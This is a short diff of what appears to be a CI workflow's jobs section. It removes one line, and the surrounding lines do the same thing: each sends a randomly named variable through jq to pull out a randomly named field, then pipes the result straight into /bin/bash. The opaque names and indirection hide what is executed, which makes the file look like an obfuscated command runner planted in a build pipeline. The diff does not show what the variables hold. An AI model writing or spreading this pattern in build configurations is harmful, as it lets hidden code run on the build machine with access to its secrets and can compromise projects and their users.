@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$di9961" | jq -r .vcfah7 | /bin/bash
           echo $pxq111 | jq -r .ovmp6 | /bin/bash
           echo $iu1045 | jq -r .lscuw44289 | /bin/bash
-          echo $ml62 | jq -r .fwsxr1164 | /bin/bash
           echo $zz9 | jq -r .w2245 | /bin/bash
           printf '%s' "$pftaa40" | jq -r .jud4 | /bin/bash
           echo $bnoj0 | jq -r .kbfvh32 | /bin/bash
